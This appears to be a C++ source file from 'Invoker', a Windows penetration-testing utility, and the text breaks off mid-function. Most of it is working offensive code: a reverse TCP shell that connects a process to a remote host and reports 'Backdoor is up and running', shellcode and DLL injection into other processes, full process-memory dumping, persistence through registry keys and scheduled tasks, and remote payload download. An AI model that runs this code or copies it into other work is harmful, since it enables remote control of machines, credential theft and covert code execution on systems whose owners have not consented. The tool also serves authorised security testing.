// Copyright (c) 2019 Ivan Šincek

#include <winsock2.h>
#pragma  comment(lib, "ws2_32")
#include <ws2tcpip.h>
#include ".\invoker.h"
#include <iostream>
#include <fstream>
#pragma  comment(lib, "ole32")
#include <initguid.h>
#include <mstask.h>
#pragma  comment(lib, "uuid")
#include <wbemidl.h>
#pragma  comment(lib, "wbemuuid")
#pragma  comment(lib, "oleaut32")
#include <tlhelp32.h>

// ---------------------------------- STRINGS ----------------------------------

std::string IntToStr(int num) {
	char str[STRING_BUFFER_SIZE] = "";
	sprintf_s(str, "%d", num);
	return std::string(str);
}

int StrToInt(std::string str) {
	char num[STRING_BUFFER_SIZE] = "";
	sprintf_s(num, "%s", str.c_str());
	return atoi(num);
}

int StrToInt(BSTR str) {
	char num[STRING_BUFFER_SIZE] = "";
	sprintf_s(num, "%ls", str);
	return atoi(num);
}

std::string StrToLower(std::string str) {
	size_t length = str.length();
	for (size_t i = 0; i < length; i++) {
		str[i] = tolower(str[i]);
	}
	return str;
}

std::string StrToUpper(std::string str) {
	size_t length = str.length();
	for (size_t i = 0; i < length; i++) {
		str[i] = toupper(str[i]);
	}
	return str;
}

void Output(std::string msg) {
	printf(msg.append("\n").c_str());
}

std::string Trim(std::string str) {
	const char spacing[] = "\x20\x09\x10\x11\x12\x13\x0A\x0D";
	str.erase(0, str.find_first_not_of(spacing));
	str.erase(str.find_last_not_of(spacing) + 1);
	return str;
}

std::string Input(std::string msg) {
	printf(msg.append(": ").c_str());
	std::string var = "";
	getline(std::cin, var);
	return Trim(var);
}

bool IsPositiveNumber(std::string str) {
	const char numbers[] = "0123456789";
	return str.find_first_not_of(numbers) == std::string::npos;
}

std::string StrStripFirstFront(std::string str, std::string delim, bool clear) {
	size_t pos = str.find(delim);
	if (pos != std::string::npos) {
		str.erase(0, pos + delim.length());
	}
	else if (clear) {
		str.clear();
	}
	return str;
}

std::string StrStripFirstBack(std::string str, std::string delim, bool clear) {
	size_t pos = str.find(delim);
	if (pos != std::string::npos) {
		str.erase(pos);
	}
	else if (clear) {
		str.clear();
	}
	return str;
}

std::string GetErrorMessage(int code) {
	LPSTR msg = NULL;
	FormatMessageA((FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_IGNORE_INSERTS), NULL, code, MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), (LPSTR)&msg, 0, NULL);
	return msg == NULL ? "Cannot generate the error message" : Trim(msg);
}

// ----------------------------------- SHELL -----------------------------------

std::string GetFileName(HMODULE hModule) {
	char buffer[MAX_PATH] = "";
	if (GetModuleFileNameA(hModule, buffer, sizeof(buffer)) == 0) {
		Output("Cannot retreive the module name");
	}
	return std::string(buffer);
}

bool IsShellAccessible() {
	bool success = false;
	if (system("echo \"Invoker\" 1>nul") == 0) {
		success = true;
	}
	else {
		Output("Cannot access the shell");
	}
	return success;
}

void Pause() {
	Output("");
	printf("Press any key to continue . . . ");
	getchar();
}

void Clear() {
	if (system("echo \"Invoker\" 1>nul") == 0) {
		system("CLS");
	}
	else {
		Output("");
	}
}

void ShellExec(std::string command) {
	if (IsShellAccessible()) {
		command = command.length() > 0 ? "CMD /K \"" + command + "\"" : "CMD";
		system(command.c_str());
	}
}

void PowerShellExec(std::string command) {
	if (IsShellAccessible()) {
		command = command.length() > 0 ? "PowerShell -ExecutionPolicy Unrestricted -NoProfile -EncodedCommand " + command : "PowerShell -ExecutionPolicy Unrestricted -NoProfile";
		system(command.c_str());
	}
}

// ----------------------------------- FILES -----------------------------------

bool CreateFile(std::string out, std::string data) {
	bool success = false;
	std::ofstream stream(out.c_str(), (std::ios::out | std::ios::trunc | std::ios::binary));
	if (stream.fail()) {
		Output("Cannot create \"" + out + "\"");
	}
	else {
		stream.write(data.c_str(), data.length());
		success = true;
		Output("\"" + out + "\" has been created successfully");
		stream.close();
	}
	return success;
}

std::string ReadFile(std::string file) {
	std::string data = "";
	std::ifstream stream(file.c_str(), (std::ios::in | std::ios::binary));
	if (stream.fail()) {
		Output("Cannot read \"" + file + "\"");
	}
	else {
		char* buffer = new char[STREAM_BUFFER_SIZE];
		while (!stream.eof()) {
			stream.read(buffer, STREAM_BUFFER_SIZE);
			data.append(buffer, stream.gcount());
		}
		delete[] buffer;
		if (data.length() < 1) {
			Output("\"" + file + "\" is empty");
		}
		stream.close();
	}
	return data;
}

bool AppendFile(std::string file, std::string data) {
	bool success = false;
	std::ofstream stream(file.c_str(), (std::ios::app | std::ios::binary));
	if (!stream.fail()) {
		stream.write(data.c_str(), data.length());
		success = true;
		stream.close();
	}
	return success;
}

bool DuplicateFile(std::string file, std::string out) {
	bool success = false;
	std::ifstream stream(file.c_str(), (std::ios::in | std::ios::binary));
	if (stream.fail()) {
		Output("Cannot read \"" + file + "\"");
	}
	else {
		std::string data = "";
		char* buffer = new char[STREAM_BUFFER_SIZE];
		while (!stream.eof()) {
			stream.read(buffer, STREAM_BUFFER_SIZE);
			data.append(buffer, stream.gcount());
		}
		delete[] buffer;
		stream.close();
		std::ofstream stream(out.c_str(), (std::ios::out | std::ios::trunc | std::ios::binary));
		if (stream.fail()) {
			Output("Cannot create \"" + out + "\"");
		}
		else {
			stream.write(data.c_str(), data.length());
			success = true;
			Output("\"" + file + "\" has been successfully copied to \"" + out + "\"");
			stream.close();
		}
	}
	return success;
}

bool DownloadFile(std::string url, std::string out) {
	bool success = false;
	HMODULE hLib = LoadLibrary(L"urlmon.dll");
	if (hLib == NULL) {
		Output("Cannot load the urlmon.dll");
	}
	else {
		MyURLDownloadToFile Function = (MyURLDownloadToFile)GetProcAddress(hLib, "URLDownloadToFileA");
		if (Function == NULL) {
			Output("Cannot get the address of URLDownloadToFileA()");
		}
		else if (FAILED(Function(NULL, url.c_str(), out.c_str(), 0, NULL))) {
			Output("Cannot download \"" + url + "\"");
		}
		else {
			success = true;
			Output("Download has been saved to \"" + out + "\"");
		}
		FreeLibrary(hLib);
	}
	return success;
}

// -------------------------------- PERSISTENCE --------------------------------

// TO DO: List all registry keys.
// TO DO: Delete a registry key.
// TO DO: Add support for more data types.
bool EditRegistryKey(PHKEY hKey, std::string subkey, std::string name, std::string data) {
	bool success = false;
	HKEY nKey = NULL;
	if (RegCreateKeyExA(*hKey, subkey.c_str(), 0, NULL, REG_OPTION_NON_VOLATILE, (KEY_CREATE_SUB_KEY | KEY_SET_VALUE), NULL, &nKey, NULL) != ERROR_SUCCESS) {
		Output("Cannot create/open the registry key");
	}
	else if (RegSetValueExA(nKey, name.c_str(), 0, REG_SZ, (LPBYTE)data.c_str(), data.length()) != ERROR_SUCCESS) {
		Output("Cannot add/eddit the registry key");
	}
	else {
		success = true;
		Output("Registry key has been added/edited successfully");
	}
	if (nKey != NULL && RegCloseKey(nKey) != ERROR_SUCCESS) {
		Output("");
		Output("Cannot close the registry key handle");
	}
	return success;
}

// TO DO: List all local users.
bool ScheduleTask(std::string name, std::string user, std::string file, std::string args) {
	bool success = false;
	if (FAILED(CoInitializeEx(NULL, COINIT_MULTITHREADED))) {
		Output("Cannot initialize the use of COM library");
	}
	else {
		ITaskScheduler* tskschd = NULL;
		if (FAILED(CoCreateInstance(CLSID_CTaskScheduler, NULL, CLSCTX_INPROC_SERVER, IID_ITaskScheduler, (LPVOID*)&tskschd))) {
			Output("Cannot create the COM class object of Task Scheduler");
		}
		else {
			ITask* task = NULL;
			if (FAILED(tskschd->NewWorkItem(std::wstring(name.begin(), name.end()).c_str(), CLSID_CTask, IID_ITask, (IUnknown**)&task))) {
				Output("Cannot create the task");
			}
			else {
				task->SetAccountInformation(std::wstring(user.begin(), user.end()).c_str(), NULL);
				task->SetApplicationName(std::wstring(file.begin(), file.end()).c_str());
				task->SetParameters(std::wstring(args.begin(), args.end()).c_str());
				task->SetFlags(TASK_FLAG_RUN_ONLY_IF_LOGGED_ON);
				WORD index = 0;
				ITaskTrigger* trigger = NULL;
				if (FAILED(task->CreateTrigger(&index, &trigger))) {
					Output("Cannot create the trigger");
				}
				else {
					SYSTEMTIME now = { 0 };
					GetLocalTime(&now);
					TASK_TRIGGER info = { 0 };
					info.cbTriggerSize = sizeof(info);
					// NOTE: Task will trigger only once.
					info.TriggerType = TASK_TIME_TRIGGER_ONCE;
					// NOTE: Task will trigger after exactly one minute.
					info.wStartMinute = now.wMinute + 1;
					info.wStartHour = now.wHour;
					info.wBeginDay = now.wDay;
					info.wBeginMonth = now.wMonth;
					info.wBeginYear = now.wYear;
					if (FAILED(trigger->SetTrigger(&info))) {
						Output("Cannot set the trigger");
					}
					else {
						IPersistFile* pFile = NULL;
						if (FAILED(task->QueryInterface(IID_IPersistFile, (LPVOID*)&pFile))) {
							Output("Cannot get the persistance interface");
						}
						else {
							if (FAILED(pFile->Save(NULL, TRUE))) {
								Output("Cannot save the task object to a file");
							}
							else {
								success = true;
								Output("Task has been scheduled successfully");
							}
							pFile->Release();
						}
					}
					trigger->Release();
				}
				task->Release();
			}
			tskschd->Release();
		}
		CoUninitialize();
	}
	return success;
}

// ------------------------------------ WMI ------------------------------------

void WMIRunQuery(std::string query, std::string language, std::string space) {
	if (FAILED(CoInitializeEx(NULL, COINIT_MULTITHREADED))) {
		Output("Cannot initialize the use of COM library");
	}
	else if (FAILED(CoInitializeSecurity(NULL, -1, NULL, NULL, RPC_C_AUTHN_LEVEL_DEFAULT, RPC_C_IMP_LEVEL_IMPERSONATE, NULL, EOAC_NONE, NULL))) {
		Output("Cannot initialize the use of COM security");
	}
	else {
		IWbemLocator* locator = NULL;
		if (FAILED(CoCreateInstance(CLSID_WbemLocator, NULL, CLSCTX_INPROC_SERVER, IID_IWbemLocator, (LPVOID*)&locator))) {
			Output("Cannot create the COM class object of WMI");
		}
		else {
			BSTR bstrSpace = SysAllocString(std::wstring(space.begin(), space.end()).c_str());
			IWbemServices* services = NULL;
			if (FAILED(locator->ConnectServer(bstrSpace, NULL, NULL, NULL, 0, NULL, NULL, &services))) {
				Output("Cannot connect to the WMI namespace");
			}
			else {
				if (FAILED(CoSetProxyBlanket(services, RPC_C_AUTHN_WINNT, RPC_C_AUTHZ_NONE, NULL, RPC_C_AUTHN_LEVEL_CALL, RPC_C_IMP_LEVEL_IMPERSONATE, NULL, EOAC_NONE))) {
					Output("Cannot set the WMI proxy");
				}
				else {
					BSTR bstrLanguage = SysAllocString(std::wstring(language.begin(), language.end()).c_str());
					BSTR bstrQuery = SysAllocString(std::wstring(query.begin(), query.end()).c_str());
					IEnumWbemClassObject* enumerator = NULL;
					if (FAILED(services->ExecQuery(bstrLanguage, bstrQuery, WBEM_FLAG_FORWARD_ONLY, NULL, &enumerator))) {
						Output("Cannot execute the WMI query");
					}
					else {
						IWbemClassObject* obj[WMI_ARRAY_SIZE] = { NULL };
						unsigned long returned = 0;
						bool exists = false;
						Output("Querying...");
						while (SUCCEEDED(enumerator->Next(WBEM_INFINITE, WMI_ARRAY_SIZE, obj, &returned)) && returned != 0) {
							exists = true;
							for (unsigned long i = 0; i < returned; i++) {
								Output("");
								SAFEARRAY* array = { NULL };
								long start = 0, end = 0;
								BSTR* bstr = NULL;
								if (FAILED(obj[i]->GetNames(0, WBEM_FLAG_ALWAYS, 0, &array)) || FAILED(SafeArrayGetLBound(array, 1, &start)) || FAILED(SafeArrayGetUBound(array, 1, &end)) || FAILED(SafeArrayAccessData(array, (void HUGEP**) & bstr))) {
									Output("Cannot parse the WMI class object");
								}
								else {
									for (long j = start; j < end; j++) {
										VARIANT data;
										VariantInit(&data);
										if (SUCCEEDED(obj[i]->Get(bstr[j], 0, &data, NULL, 0)) && V_VT(&data) == VT_BSTR) {
											printf("%ls: %ls\n", bstr[j], V_BSTR(&data));
										}
										VariantClear(&data);
									}
								}
								obj[i]->Release();
							}
						}
						if (!exists) {
							Output("");
							Output("No results");
						}
						enumerator->Release();
					}
					SysFreeString(bstrQuery);
					SysFreeString(bstrLanguage);
				}
				services->Release();
			}
			SysFreeString(bstrSpace);
			locator->Release();
		}
		CoUninitialize();
	}
}

bool WMIExecuteMethod(std::string obj, std::string method, std::string space) {
	bool success = false;
	if (FAILED(CoInitializeEx(NULL, COINIT_MULTITHREADED))) {
		Output("Cannot initialize the use of COM library");
	}
	else if (FAILED(CoInitializeSecurity(NULL, -1, NULL, NULL, RPC_C_AUTHN_LEVEL_DEFAULT, RPC_C_IMP_LEVEL_IMPERSONATE, NULL, EOAC_NONE, NULL))) {
		Output("Cannot initialize the use of COM security");
	}
	else {
		IWbemLocator* locator = NULL;
		if (FAILED(CoCreateInstance(CLSID_WbemLocator, NULL, CLSCTX_INPROC_SERVER, IID_IWbemLocator, (LPVOID*)&locator))) {
			Output("Cannot create the COM class object of WMI");
		}
		else {
			BSTR bstrSpace = SysAllocString(std::wstring(space.begin(), space.end()).c_str());
			IWbemServices* services = NULL;
			if (FAILED(locator->ConnectServer(bstrSpace, NULL, NULL, NULL, 0, NULL, NULL, &services))) {
				Output("Cannot connect to the WMI namespace");
			}
			else {
				if (FAILED(CoSetProxyBlanket(services, RPC_C_AUTHN_WINNT, RPC_C_AUTHZ_NONE, NULL, RPC_C_AUTHN_LEVEL_CALL, RPC_C_IMP_LEVEL_IMPERSONATE, NULL, EOAC_NONE))) {
					Output("Cannot set the WMI proxy");
				}
				else {
					BSTR bstrInstance = SysAllocString(std::wstring(obj.begin(), obj.end()).c_str());
					obj = StrStripFirstBack(obj, ".");
					BSTR bstrClass = SysAllocString(std::wstring(obj.begin(), obj.end()).c_str());
					IWbemClassObject* objClass = NULL;
					if (FAILED(services->GetObject(bstrClass, 0, NULL, &objClass, NULL))) {
						Output("Cannot get the WMI object class");
					}
					else {
						BSTR bstrMethod = SysAllocString(std::wstring(method.begin(), method.end()).c_str());
						IWbemClassObject* objResults = NULL;
						if (FAILED(services->ExecMethod(bstrInstance, bstrMethod, 0, NULL, NULL, &objResults, NULL))) {
							Output("Cannot execute the WMI object class method");
						}
						else {
							success = true;
							Output("WMI object class method has been executed successfully");
							VARIANT results;
							VariantInit(&results);
							if (SUCCEEDED(objResults->Get(L"ReturnValue", 0, &results, NULL, 0)) && V_VT(&results) == VT_I4) {
								Output("");
								Output("HRESULT: " + GetErrorMessage(StrToInt(V_BSTR(&results))));
							}
							VariantClear(&results);
							objResults->Release();
						}
						SysFreeString(bstrMethod);
						objClass->Release();
					}
					SysFreeString(bstrClass);
					SysFreeString(bstrInstance);
				}
				services->Release();
			}
			SysFreeString(bstrSpace);
			locator->Release();
		}
		CoUninitialize();
	}
	return success;
}

bool WMIExecuteMethod(std::string obj, std::string method, std::string property, std::string value, std::string space) {
	bool success = false;
	if (FAILED(CoInitializeEx(NULL, COINIT_MULTITHREADED))) {
		Output("Cannot initialize the use of COM library");
	}
	else if (FAILED(CoInitializeSecurity(NULL, -1, NULL, NULL, RPC_C_AUTHN_LEVEL_DEFAULT, RPC_C_IMP_LEVEL_IMPERSONATE, NULL, EOAC_NONE, NULL))) {
		Output("Cannot initialize the use of COM security");
	}
	else {
		IWbemLocator* locator = NULL;
		if (FAILED(CoCreateInstance(CLSID_WbemLocator, NULL, CLSCTX_INPROC_SERVER, IID_IWbemLocator, (LPVOID*)&locator))) {
			Output("Cannot create the COM class object of WMI");
		}
		else {
			BSTR bstrSpace = SysAllocString(std::wstring(space.begin(), space.end()).c_str());
			IWbemServices* services = NULL;
			if (FAILED(locator->ConnectServer(bstrSpace, NULL, NULL, NULL, 0, NULL, NULL, &services))) {
				Output("Cannot connect to the WMI namespace");
			}
			else {
				if (FAILED(CoSetProxyBlanket(services, RPC_C_AUTHN_WINNT, RPC_C_AUTHZ_NONE, NULL, RPC_C_AUTHN_LEVEL_CALL, RPC_C_IMP_LEVEL_IMPERSONATE, NULL, EOAC_NONE))) {
					Output("Cannot set the WMI proxy");
				}
				else {
					BSTR bstrInstance = SysAllocString(std::wstring(obj.begin(), obj.end()).c_str());
					obj = StrStripFirstBack(obj, ".");
					BSTR bstrClass = SysAllocString(std::wstring(obj.begin(), obj.end()).c_str());
					IWbemClassObject* objClass = NULL;
					if (FAILED(services->GetObject(bstrClass, 0, NULL, &objClass, NULL))) {
						Output("Cannot get the WMI object class");
					}
					else {
						BSTR bstrMethod = SysAllocString(std::wstring(method.begin(), method.end()).c_str());
						IWbemClassObject* objMethod = NULL;
						if (FAILED(objClass->GetMethod(bstrMethod, 0, &objMethod, NULL))) {
							Output("Cannot get the WMI object class method");
						}
						else {
							IWbemClassObject* objInstance = NULL;
							if (FAILED(objMethod->SpawnInstance(0, &objInstance))) {
								Output("Cannot spawn the new instance of WMI class object");
							}
							else {
								BSTR bstrProperty = SysAllocString(std::wstring(property.begin(), property.end()).c_str());
								VARIANT data;
								VariantInit(&data);
								if (atoi(value.c_str())) {
									V_VT(&data) = VT_I4;
								}
								else {
									V_VT(&data) = VT_BSTR;
								}
								V_BSTR(&data) = SysAllocString(std::wstring(value.begin(), value.end()).c_str());
								if (FAILED(objInstance->Put(bstrProperty, 0, &data, 0))) {
									Output("Cannot set the property of new WMI class object");
								}
								else {
									IWbemClassObject* objResults = NULL;
									if (FAILED(services->ExecMethod(bstrInstance, bstrMethod, 0, NULL, objInstance, &objResults, NULL))) {
										Output("Cannot execute the WMI object class method");
									}
									else {
										success = true;
										Output("WMI object class method has been executed successfully");
										VARIANT results;
										VariantInit(&results);
										if (SUCCEEDED(objResults->Get(L"ReturnValue", 0, &results, NULL, 0)) && V_VT(&results) == VT_I4) {
											Output("");
											Output("HRESULT: " + GetErrorMessage(StrToInt(V_BSTR(&results))));
										}
										VariantClear(&results);
										objResults->Release();
									}
								}
								if (V_VT(&data) == VT_BSTR) {
									SysFreeString(data.bstrVal);
								}
								VariantClear(&data);
								SysFreeString(bstrProperty);
								objInstance->Release();
							}
							objMethod->Release();
						}
						SysFreeString(bstrMethod);
						objClass->Release();
					}
					SysFreeString(bstrClass);
					SysFreeString(bstrInstance);
				}
				services->Release();
			}
			SysFreeString(bstrSpace);
			locator->Release();
		}
		CoUninitialize();
	}
	return success;
}

// --------------------------------- PROCESSES ---------------------------------

bool ReverseTCP(std::string addr, std::string port, std::string args) {
	bool success = false;
	WSADATA wsaData = { 0 };
	if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
		Output("Cannot initiate the use of Winsock DLL");
	}
	else {
		struct addrinfo info = { 0 };
		info.ai_family = AF_UNSPEC;
		info.ai_socktype = SOCK_STREAM;
		info.ai_protocol = IPPROTO_TCP;
		struct addrinfo* result = NULL;
		if (getaddrinfo(addr.c_str(), port.c_str(), &info, &result) != 0) {
			Output("Cannot resolve the server address");
		}
		else {
			SOCKET hSocket = WSASocket(result->ai_family, result->ai_socktype, result->ai_protocol, NULL, 0, 0);
			if (hSocket == INVALID_SOCKET) {
				Output("Cannot create the connection socket");
			}
			else {
				if (WSAConnect(hSocket, result->ai_addr, (int)result->ai_addrlen, NULL, NULL, NULL, NULL) != 0) {
					Output("Cannot connect to the server");
				}
				else {
					STARTUPINFOA sInfo = { 0 };
					sInfo.cb = sizeof(sInfo);
					sInfo.dwFlags = STARTF_USESTDHANDLES;
					sInfo.hStdInput = sInfo.hStdOutput = sInfo.hStdError = (HANDLE)hSocket;
					PROCESS_INFORMATION pInfo = { 0 };
					if (CreateProcessA(NULL, (LPSTR)args.c_str(), NULL, NULL, TRUE, 0, NULL, NULL, &sInfo, &pInfo) == 0) {
						Output("Cannot run the process");
					}
					else {
						success = true;
						Output("Backdoor is up and running...");
						WaitForSingleObject(pInfo.hProcess, INFINITE);
						CloseHandle(pInfo.hProcess);
						CloseHandle(pInfo.hThread);
					}
				}
				closesocket(hSocket);
			}
			freeaddrinfo(result);
		}
		WSACleanup();
	}
	return success;
}

// NOTE: Returns true if process is a 32-bit process, false otherwise.
bool IsWoW64(int pid) {
	BOOL success = false;
	HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, 0, pid);
	if (hProcess == NULL) {
		hProcess = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, 0, pid);
	}
	if (hProcess != NULL) {
		IsWow64Process(hProcess, &success);
		CloseHandle(hProcess);
	}
	return success;
}

// NOTE: Returns -1 on failure or if process does not exists.
int GetProcessID() {
	bool exists = false;
	PROCESSENTRY32 entry = { 0 };
	entry.dwSize = sizeof(entry);
	HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (hSnapshot == INVALID_HANDLE_VALUE) {
		Output("Cannot create the snapshot of current processes");
	}
	else {
		Output("############################### PROCESS LIST ###############################");
		printf("# %-6s | %-*.*s | %-4s #\n", "PID", 56, 56, "NAME", "ARCH");
		Output("#--------------------------------------------------------------------------#");
		while (Process32Next(hSnapshot, &entry)) {
			printf("# %-6d | %-*.*ls | %-4s #\n", entry.th32ProcessID, 56, 56, entry.szExeFile, IsWoW64(entry.th32ProcessID) ? "32" : "64");
		}
		Output("############################################################################");
		std::string id = Input("Enter proccess ID");
		if (id.length() < 1) {
			Output("");
			Output("Process ID is rquired");
		}
		else if (!IsPositiveNumber(id)) {
			Output("");
			Output("Process ID must be a positive number");
		}
		else {
			int pid = atoi(id.c_str());
			Process32First(hSnapshot, &entry);
			do {
				if (entry.th32ProcessID == pid) {
					exists = true;
					break;
				}
			} while (Process32Next(hSnapshot, &entry));
			if (!exists) {
				Output("");
				Output("Process does not exists");
			}
		}
		CloseHandle(hSnapshot);
	}
	return exists ? entry.th32ProcessID : -1;
}

bool TerminateProcess(int pid) {
	bool success = false;
	HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, 0, pid);
	if (hProcess == NULL) {
		Output("Cannot get the process handle");
	}
	else {
		if (TerminateProcess(hProcess, 0) == 0) {
			Output("Cannot terminate the process");
		}
		else {
			success = true;
			Output("Process has been terminated successfully");
		}
		CloseHandle(hProcess);
	}
	return success;
}

bool RunProcess(std::string file, std::string args, PHANDLE hToken) {
	bool success = false;
	PROCESS_INFORMATION pInfo = { 0 };
	if (hToken == NULL) {
		STARTUPINFOA sInfo = { 0 };
		sInfo.cb = sizeof(sInfo);
		if (CreateProcessA(file.c_str(), (LPSTR)args.c_str(), NULL, NULL, 0, CREATE_NEW_CONSOLE, NULL, NULL, &sInfo, &pInfo) != 0) {
			success = true;
		}
	}
	else {
		STARTUPINFOW sInfo = { 0 };
		sInfo.cb = sizeof(sInfo);
		if (CreateProcessWithTokenW(*hToken, LOGON_WITH_PROFILE, std::wstring(file.begin(), file.end()).c_str(), (LPWSTR)args.c_str(), CREATE_NEW_CONSOLE, NULL, NULL, &sInfo, &pInfo) != 0) {
			success = true;
		}
	}
	if (success) {
		Output("Process has been run successfully");
		CloseHandle(pInfo.hProcess);
		CloseHandle(pInfo.hThread);
	}
	else {
		Output("Cannot run the process");
	}
	return success;
}

bool DumpProcessMemory(int pid) {
	bool success = false;
	HANDLE hProcess = OpenProcess((PROCESS_QUERY_INFORMATION | PROCESS_VM_READ), 0, pid);
	if (hProcess == NULL) {
		hProcess = OpenProcess((PROCESS_QUERY_LIMITED_INFORMATION | PROCESS_VM_READ), 0, pid);
	}
	if (hProcess == NULL) {
		Output("Cannot get the process handle");
	}
	else {
		HMODULE hLib = LoadLibrary(L"dbgcore.dll");
		if (hLib == NULL) {
			Output("Cannot load the dbgcore.dll");
		}
		else {
			MyMiniDumpWriteDump Function = (MyMiniDumpWriteDump)GetProcAddress(hLib, "MiniDumpWriteDump");
			if (Function == NULL) {
				Output("Cannot get the address of MiniDumpWriteDump()");
			}
			else {
				std::string out = std::string("proc_mem_").append(IntToStr(pid)).append(".dmp");
				HANDLE hFile = CreateFileA(out.c_str(), GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
				if (hFile == INVALID_HANDLE_VALUE) {
					Output("Cannot create \"" + out + "\"");
				}
				else if (Function(hProcess, pid, hFile, 0x00000001, NULL, NULL, NULL) == 0) {
					// NOTE: 0x00000001 == MiniDumpWithFullMemory
					CloseHandle(hFile);
					DeleteFileA(out.c_str());
					Output("Cannot dump the process memory");
				}
				else {
					success = true;
					Output("Process memory has been dumped to \"" + out + "\"");
					CloseHandle(hFile);
				}
			}
			FreeLibrary(hLib);
		}
		CloseHandle(hProcess);
	}
	return success;
}

// --------------------------------- BYTECODES ---------------------------------

// NOTE: This method does not yet support HTTPS.
std::string GetWebContent(std::string url, std::string port, std::string method) {
	std::string data = "";
	url = StrStripFirstFront(url, "://");
	std::string host = StrStripFirstBack(url, "/");
	std::string path = "/" + StrStripFirstFront(url, "/", true);
	WSADATA wsaData = { 0 };
	if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
		Output("Cannot initiate the use of Winsock DLL");
	}
	else {
		struct addrinfo info = { 0 };
		info.ai_family = AF_UNSPEC;
		info.ai_socktype = SOCK_STREAM;
		info.ai_protocol = IPPROTO_TCP;
		struct addrinfo* result = NULL;
		if (getaddrinfo(host.c_str(), port.c_str(), &info, &result) != 0) {
			Output("Cannot resolve the server address");
		}
		else {
			SOCKET hSocket = WSASocket(result->ai_family, result->ai_socktype, result->ai_protocol, NULL, 0, 0);
			if (hSocket == INVALID_SOCKET) {
				Output("Cannot create the connection socket");
			}
			else {
				if (WSAConnect(hSocket, result->ai_addr, (int)result->ai_addrlen, NULL, NULL, NULL, NULL) != 0) {
					Output("Cannot connect to the server");
				}
				else {
					// NOTE: You can edit the HTTP request header here.
					// NOTE: By default, HTTP GET request will be sent.
					std::string request = StrToUpper(method) + " " + path + " HTTP/1.1\r\nHost: " + host + "\r\nConnection: close\r\n\r\n";
					send(hSocket, request.c_str(), request.length(), 0);
					char* buffer = new char[STREAM_BUFFER_SIZE];
					int bytes = 0;
					do {
						bytes = recv(hSocket, buffer, STREAM_BUFFER_SIZE, 0);
						data.append(buffer, bytes);
					} while (bytes != 0);
					delete[] buffer;
					if (data.length() < 1) {
						Output("No data has been received");
					}
					else if (data.find("200 OK") == std::string::npos) {
						data.clear();
						Output("HTTP status code is not \"200 OK\"");
					}
				}
				closesocket(hSocket);
			}
			freeaddrinfo(result);
		}
		WSACleanup();
	}
	return data;
}

std::string ExtractPayload(std::string data, std::string element, std::string placeholder) {
	std::string payload = "";
	if (element.find(placeholder) == std::string::npos) {
		Output("Payload placeholder has not been found");
	}
	else {
		std::string front = StrStripFirstBack(element, placeholder);
		std::string back = StrStripFirstFront(element, placeholder);
		if (front.length() < 1 || back.length() < 1) {
			Output("Payload must be enclosed from both front and back");
		}
		else {
			front = data = StrStripFirstFront(data, front, true);
			back = data = StrStripFirstBack(data, back, true);
			if (front.length() < 1 || back.length() < 1) {
				Output("Custom element has not been found or is empty");
			}
			else {
				payload = data;
				Output("Payload has been extracted successfully");
			}
		}
	}
	return payload;
}

bool InjectBytecode(int pid, std::string bytecode) {
	bool success = false;
	HANDLE hProcess = OpenProcess((PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_CREATE_THREAD), 0, pid);
	if (hProcess == NULL) {
		Output("Cannot get the process handle");
	}
	else {
		LPVOID addr = VirtualAllocEx(hProcess, NULL, bytecode.length(), (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
		if (addr == NULL) {
			Output("Cannot allocate the additional process memory");
		}
		else {
			if (WriteProcessMemory(hProcess, addr, bytecode.c_str(), bytecode.length(), NULL) == 0) {
				Output("Cannot write to the process memory");
			}
			else {
				HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)addr, NULL, 0, NULL);
				if (hThread == NULL) {
					Output("Cannot start the process thread");
				}
				else {
					success = true;
					Output("Bytecode has been injected successfully");
					CloseHandle(hThread);
				}
			}
			VirtualFreeEx(hProcess, addr, bytecode.length(), MEM_RELEASE);
		}
		CloseHandle(hProcess);
	}
	return success;
}

// ------------------------------------ DLL ------------------------------------

bool InjectDLL(int pid, std::string file) {
	bool success = false;
	HANDLE hProcess = OpenProcess((PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_CREATE_THREAD), 0, pid);
	if (hProcess == NULL) {
		Output("Cannot get the process handle");
	}
	else {
		LPVOID addr = VirtualAllocEx(hProcess, NULL, file.length(), (MEM_RESERVE | MEM_COMMIT), PAGE_READWRITE);
		if (addr == NULL) {
			Output("Cannot allocate the additional process memory");
		}
		else {
			if (WriteProcessMemory(hProcess, addr, file.c_str(), file.length(), NULL) == 0) {
				Output("Cannot write to the process memory");
			}
			else {
				HMODULE hLib = LoadLibrary(L"kernel32.dll");
				if (hLib == NULL) {
					Output("Cannot load the kernel32.dll");
				}
				else {
					LPTHREAD_START_ROUTINE lpRoutine = (LPTHREAD_START_ROUTINE)GetProcAddress(hLib, "LoadLibraryA");
					if (lpRoutine == NULL) {
						Output("Cannot get the address of LoadLibraryA()");
					}
					else {
						HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, lpRoutine, addr, 0, NULL);
						if (hThread == NULL) {
							Output("Cannot start the process thread");
						}
						else {
							success = true;
							Output("DLL has been injected successfully");
							CloseHandle(hThread);
						}
					}
					FreeLibrary(hLib);
				}
			}
			VirtualFreeEx(hProcess, addr, file.length(), MEM_RELEASE);
		}
		CloseHandle(hProcess);
	}
	return success;
}

// NOTE: This method will only list loaded DLLs. 
// TO DO: List missing DLLs.
void ListProcessDLLs(int pid) {
	HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE, pid);
	if (hSnapshot == INVALID_HANDLE_VALUE) {
		Output("Cannot create the snapshot of process modules");
	}
	else {
		MODULEENTRY32 entry = { 0 };
		entry.dwSize = sizeof(entry);
		bool exists = false;
		while (Module32Next(hSnapshot, &entry)) {
			exists = true;
			printf("%ls\n", entry.szExePath);
		}
		if (!exists) {
			Output("No DLLs are loaded");
		}
